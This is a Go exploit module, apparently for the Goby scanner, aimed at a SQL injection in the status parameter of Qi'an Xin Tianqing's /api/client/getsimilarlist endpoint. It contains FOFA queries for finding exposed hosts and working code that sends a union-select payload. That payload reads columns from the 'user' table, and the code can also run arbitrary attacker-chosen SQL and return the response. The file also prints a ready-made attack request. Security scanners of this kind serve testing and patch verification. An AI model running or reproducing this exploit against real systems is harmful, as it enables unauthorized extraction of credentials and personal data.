package exploits

import (
	"bytes"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tianqing Terminal Security Management System getsimilarlist status SQL injection vulnerability",
    "Description": "<p>Qi'an Xin tianqing terminal security management system is an integrated terminal security solution that focuses on effectiveness.</p><p>There is a SQL injection vulnerability in the ?status parameter of Qi'an Xin tianqing's /api/client/getsimilarlist route. An attacker can use the vulnerability to obtain sensitive information in the database.</p>",
    "Product": "Qianxin-TianQing",
    "Homepage": "https://www.qianxin.com/",
    "DisclosureDate": "2023-03-17",
    "Author": "715827922@qq.com",
    "FofaQuery": "header=\"QiAnXin web server\" || banner=\"QiAnXin web server\" || header=\"360 web server\" || banner=\"360 web server\" || title=\"360新天擎\" || body=\"appid\\\":\\\"skylar6\" || body=\"/task/index/detail?id={item.id}\" || body=\"已过期或者未授权，购买请联系4008-136-360\" || title=\"360天擎\" || title=\"360天擎终端安全管理系统\"",
    "GobyQuery": "header=\"QiAnXin web server\" || banner=\"QiAnXin web server\" || header=\"360 web server\" || banner=\"360 web server\" || title=\"360新天擎\" || body=\"appid\\\":\\\"skylar6\" || body=\"/task/index/detail?id={item.id}\" || body=\"已过期或者未授权，购买请联系4008-136-360\" || title=\"360天擎\" || title=\"360天擎终端安全管理系统\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://qianxin.com/product/detail/pid/330\">https://qianxin.com/product/detail/pid/330</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "1) union all select (/*!50000select*/ 81911947), setting, setting, status, name, create_time from \"user\" where 1 in (1",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.2",
    "Translation": {
        "CN": {
            "Name": "天擎终端安全管理系统 getsimilarlist status SQL 注入漏洞",
            "Product": "奇安信-天擎",
            "Description": "<p>奇安信天擎终端安全管理系统是注重实效的一体化终端安全解决方案。<br></p><p>奇安信天擎 /api/client/getsimilarlist 路由的 status 参数存在 SQL 注入漏洞，攻击者可利用漏洞获取数据库中的敏感信息。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://qianxin.com/product/detail/pid/330\">https://qianxin.com/product/detail/pid/330</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>除了利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Tianqing Terminal Security Management System getsimilarlist status SQL injection vulnerability",
            "Product": "Qianxin-TianQing",
            "Description": "<p>Qi'an Xin tianqing terminal security management system is an integrated terminal security solution that focuses on effectiveness.</p><p>There is a SQL injection vulnerability in the ?status parameter of Qi'an Xin tianqing's /api/client/getsimilarlist route. An attacker can use the vulnerability to obtain sensitive information in the database.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://qianxin.com/product/detail/pid/330\">https://qianxin.com/product/detail/pid/330</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-10",
    "PocId": "10847"
}`

	sendPaylaod6f840b3c := func(u *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/api/client/getsimilarlist?status[0," + url.QueryEscape(sql) + "]=1&status[0]=1")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false

		return httpclient.DoHttpRequest(u, cfg)
	}

	randomNumString7ebaef64 := func(size int) string {
		alpha := "123456789"
		var buffer bytes.Buffer
		for i := 0; i < size; i++ {
			buffer.WriteByte(alpha[rand.Intn(len(alpha))])
		}
		return buffer.String()
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := randomNumString7ebaef64(8)
			sql := "/*!50000select*/ " + checkStr
			rsp, _ := sendPaylaod6f840b3c(u, "1) union all select (/*!50000select*/ "+checkStr+"), setting, setting, status, name, create_time from \"user\" where 1 in (1")
			return rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, sql)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			sql := goutils.B2S(ss.Params["sql"])
			if attackType == "sql" {
				rsp, err := sendPaylaod6f840b3c(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				} else {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html
				}
				return expResult
			} else if attackType == "sqlPoint" {
				checkStr := randomNumString7ebaef64(8)
				sql = "/*!50000select*/ " + checkStr
				rsp, _ := sendPaylaod6f840b3c(expResult.HostInfo, "1) union all select (/*!50000select*/ "+checkStr+"), setting, setting, status, name, create_time from \"user\" where 1 in (1")
				expResult.Success = rsp != nil && strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, sql)
				expResult.Output = "漏洞利用失败"
				if expResult.Success {
					expResult.Output = `GET /api/client/getsimilarlist?status[0,1%29+union+all+select+%28%2F%2A%2150000select%2A%2F+79787337%29%2C+setting%2C+setting%2C+status%2C+name%2C+create_time+from+%22user%22+where+1+in+%281]=1&status[0]=1 HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close

`
				}
			} else {
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
